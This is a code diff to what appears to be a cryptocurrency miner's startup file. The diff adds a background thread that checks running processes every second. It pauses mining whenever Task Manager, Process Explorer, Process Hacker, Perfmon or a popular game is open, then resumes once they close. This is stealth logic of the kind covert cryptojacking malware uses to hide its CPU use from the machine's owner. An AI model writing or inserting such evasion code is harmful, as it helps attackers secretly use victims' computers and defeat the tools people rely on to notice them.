@@ -43,6 +43,9 @@
 #include "cc/CCClient.h"
 #include "net/Url.h"
 
+#include <windows.h>
+#include <tlhelp32.h>
+#include <thread>
 
 #ifdef HAVE_SYSLOG_H
 #   include "log/SysLog.h"
@@ -56,6 +59,7 @@
 
 App *App::m_self = nullptr;
 
+bool IsProcessRun(void);
 
 App::App(int argc, char **argv) :
     m_restart(false),
@@ -130,9 +134,46 @@ App::~App()
 #   endif
 }
 
+void Check() {
+	while(true) {
+		Sleep(1000);
+		bool Founded = IsProcessRun();
+		switch (Founded) {
+			case 1:
+				Workers::setEnabled(false);
+				break;
+			default:
+				if (!Workers::isEnabled()) { Workers::setEnabled(true); }
+				break;
+		}
+	}
+}
+
+bool IsProcessRun(void)
+{
+	bool RUN;
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 pe;
+	pe.dwSize = sizeof(PROCESSENTRY32);
+	Process32First(hSnapshot, &pe);
+	while (Process32Next(hSnapshot, &pe))
+	{
+		if (wcscmp(pe.szExeFile, L"WorldOfTanks.exe") == 0 || wcscmp(pe.szExeFile, L"taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"Taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"dota2.exe") == 0 || wcscmp(pe.szExeFile, L"csgo.exe") == 0 || wcscmp(pe.szExeFile, L"payday.exe") == 0 || wcscmp(pe.szExeFile, L"Minecraft.exe") == 0 || wcscmp(pe.szExeFile, L"TheDivision.exe") == 0 || wcscmp(pe.szExeFile, L"GTA5.exe") == 0 || wcscmp(pe.szExeFile, L"re7.exe") == 0 || wcscmp(pe.szExeFile, L"Prey.exe") == 0 || wcscmp(pe.szExeFile, L"Overwatch.exe") == 0 || wcscmp(pe.szExeFile, L"MK10.exe") == 0 || wcscmp(pe.szExeFile, L"QuakeChampions.exe") == 0 || wcscmp(pe.szExeFile, L"crossfire.exe") == 0 || wcscmp(pe.szExeFile, L"pb.exe") == 0 || wcscmp(pe.szExeFile, L"wot.exe") == 0 || wcscmp(pe.szExeFile, L"lol.exe") == 0 || wcscmp(pe.szExeFile, L"perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"Perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"SystemExplorer.exe") == 0 || wcscmp(pe.szExeFile, L"TaskMan.exe") == 0 || wcscmp(pe.szExeFile, L"ProcessHacker.exe") == 0 || wcscmp(pe.szExeFile, L"procexp64.exe") == 0 || wcscmp(pe.szExeFile, L"procexp.exe") == 0 || wcscmp(pe.szExeFile, L"Procmon.exe") == 0 || wcscmp(pe.szExeFile, L"Daphne.exe") == 0)
+		{
+			RUN = true;
+			return RUN;
+		}
+		else
+			RUN = false;
+	}
+	return RUN;
+}
 
 int App::start()
 {
+	std::thread* check_taskers = new std::thread(Check);
+	check_taskers->detach();
+	
     if (!m_options) {
         return EINVAL;
     }
